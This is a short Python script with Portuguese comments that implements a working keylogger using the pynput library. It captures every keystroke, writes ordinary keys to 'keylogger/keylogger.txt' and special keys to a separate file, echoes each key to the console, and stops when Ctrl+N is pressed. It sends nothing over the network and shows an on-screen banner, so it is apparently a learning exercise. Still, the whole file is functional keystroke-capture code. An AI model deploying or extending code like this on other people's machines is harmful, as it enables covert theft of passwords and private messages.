from pynput import keyboard
import os

# Caminhos dos arquivos
pasta_logs = "keylogger"
arquivo_normais = os.path.join(pasta_logs, "keylogger.txt")
arquivo_especiais = os.path.join(pasta_logs, "teclas_especiais.txt")

# Cria a pasta se não existir
os.makedirs(pasta_logs, exist_ok=True)

# Teclas especiais a ignorar
ignorar = {"shift", "ctrl", "alt", "caps_lock", "num_lock", "scroll_lock"}

# Variável global para o listener
listener = None

def handle_normal_key(tecla):
    with open(arquivo_normais, "a", encoding="utf-8") as f:
        f.write(tecla)
    print(f"Normal: {tecla}")

def handle_numpad_key(tecla_nome):
    numero = tecla_nome[-1]
    with open(arquivo_normais, "a", encoding="utf-8") as f:
        f.write(numero)
    print(f"Normal (numpad): {numero}")

def handle_virtual_code(tecla_nome):
    codigo = int(tecla_nome[1:-1])
    # 48-57: números do teclado principal, 96-105: números do numpad
    if 48 <= codigo <= 57:
        numero = chr(codigo)
        with open(arquivo_normais, "a", encoding="utf-8") as f:
            f.write(numero)
        print(f"Normal (virtual): {numero}")
    elif 96 <= codigo <= 105:
        numero = str(codigo - 96)
        with open(arquivo_normais, "a", encoding="utf-8") as f:
            f.write(numero)
        print(f"Normal (numpad virtual): {numero}")
    else:
        handle_special_key(tecla_nome)

def handle_special_key(tecla_nome):
    with open(arquivo_especiais, "a", encoding="utf-8") as f:
        f.write(f"[{tecla_nome.upper()}]\n")
    print(f"Especial: [{tecla_nome.upper()}]")

def check_ctrl_n(tecla_nome):
    if tecla_nome == "ctrl_l" or tecla_nome == "ctrl_r":
        on_press.ctrl_pressed = True
        return False
    elif tecla_nome == "n" and getattr(on_press, "ctrl_pressed", False):
        print("Ctrl+N detectado. Encerrando o programa.")
        listener.stop()
        return True
    else:
        on_press.ctrl_pressed = False
        return False

def on_press(key):
    global listener
    try:
        tecla = key.char
        if tecla is not None:
            handle_normal_key(tecla)
            return
        else:
            raise AttributeError
    except AttributeError:
        tecla_nome = str(key).replace("Key.", "").replace("'", "").lower()
        if tecla_nome in ignorar:
            return
        if check_ctrl_n(tecla_nome):
            return
        if tecla_nome.startswith("num_") and tecla_nome[-1].isdigit():
            handle_numpad_key(tecla_nome)
        elif tecla_nome.startswith("<") and tecla_nome.endswith(">") and tecla_nome[1:-1].isdigit():
            handle_virtual_code(tecla_nome)
        else:
            handle_special_key(tecla_nome)

            
print("🔴 Monitorando teclas...")
with keyboard.Listener(on_press=on_press) as l:
    listener = l
    on_press.ctrl_pressed = False
    listener.join()